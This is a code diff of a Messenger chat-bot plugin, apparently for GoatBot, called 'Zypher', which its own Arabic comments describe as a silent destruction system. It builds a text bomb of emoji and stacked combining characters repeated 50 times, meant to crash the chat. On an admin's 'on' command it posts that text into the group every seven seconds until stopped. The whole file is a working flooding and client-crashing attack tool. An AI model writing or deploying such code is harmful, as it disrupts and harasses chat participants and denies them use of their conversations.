@@ -6,60 +6,62 @@ if (!global.zypherSniper) global.zypherSniper = {};
 module.exports = {
   config: {
     name: "زيفࢪ",
-    aliases: ["زيفࢪ_ايقاف"],
-    version: "5.5.0",
+    aliases: ["zypher"],
+    version: "7.0.0",
     author: "Hanji",
     role: 2,
-    shortDescription: "نظام زيفࢪ للدمار الصامت",
+    shortDescription: "نظام زيفࢪ للدمار الصامت بـ الـ Payload",
     category: "SYSTEM",
-    guide: { en: ".زيفࢪ | .زيفࢪ_ايقاف" }
+    guide: { en: ".زيفࢪ on | .زيفࢪ off" }
   },
 
-  onStart: async function ({ api, event }) {
-    const { threadID, senderID, body } = event;
+  onStart: async function ({ api, event, args }) {
+    const { threadID, senderID, messageID } = event;
     const adminBot = global.GoatBot?.config?.adminBot || [];
     
-    // فحص المطور (صامت)
     if (!adminBot.includes(senderID.toString())) return;
 
-    // التحقق من الملف فـ الكاش
+    const mode = args[0]?.toLowerCase();
     const cachePath = path.join(__dirname, "cache", "payload.txt");
-    if (!fs.existsSync(cachePath)) {
-        const payloadContent = "​🏴‍☠️🥷🏾👨‍👩‍👧‍👦҉͏҈͎̺̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻".repeat(90);
-        fs.writeFileSync(cachePath, payloadContent);
+
+    // تحديث النص المسموم فـ الكاش (بناءً على طلبك)
+    const toxin = "🏴‍☠️🥷🏾👨‍👩‍👧‍👦҉͏҈͎̺̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻";
+    const payloadContent = toxin.repeat(50); // تكرار 50 مرة باش يفركع الشات
+    fs.writeFileSync(cachePath, payloadContent);
+
+    // --- [ وضعية الإيقاف OFF ] ---
+    if (mode === "off") {
+        if (global.zypherSniper[threadID]) {
+            global.zypherSniper[threadID].active = false;
+            delete global.zypherSniper[threadID];
+            return api.setMessageReaction("⏹️", messageID, () => {}, true);
+        }
     }
 
-    // منطق التفعيل والإيقاف
-    if (body.includes("ايقاف")) {
-        delete global.zypherSniper[threadID];
-    } else {
-        global.zypherSniper[threadID] = { active: true, lastSent: 0 };
-    }
-  },
+    // --- [ وضعية التشغيل ON ] ---
+    if (mode === "on") {
+        if (global.zypherSniper[threadID]?.active) return;
 
-  onChat: async function ({ api, event }) {
-    const { threadID, senderID } = event;
-    const botID = api.getCurrentUserID();
+        global.zypherSniper[threadID] = { active: true };
+        api.setMessageReaction("🚀", messageID, () => {}, true);
 
-    if (senderID == botID) return;
+        const startExecution = async () => {
+            if (!global.zypherSniper[threadID] || !global.zypherSniper[threadID].active) return;
 
-    if (global.zypherSniper[threadID] && global.zypherSniper[threadID].active) {
-        const now = Date.now();
-        const cooldown = 6000; 
-        const lastSent = global.zypherSniper[threadID].lastSent;
-
-        if (now - lastSent < cooldown) return;
-
-        try {
-            const cachePath = path.join(__dirname, "cache", "payload.txt");
-            if (fs.existsSync(cachePath)) {
-                global.zypherSniper[threadID].lastSent = now;
+            try {
                 const payload = fs.readFileSync(cachePath, "utf-8");
-                
-                // إرسال عادي باش نتفاداو Error تع notificationType
-                return api.sendMessage(payload, threadID);
+                await api.sendMessage(payload, threadID);
+
+                // ⏳ 7 ثواني بين كل صاعقة
+                setTimeout(startExecution, 7000);
+
+            } catch (e) {
+                console.error("Sniper Error:", e);
+                delete global.zypherSniper[threadID];
             }
-        } catch (e) {}
+        };
+
+        startExecution();
     }
   }
 };
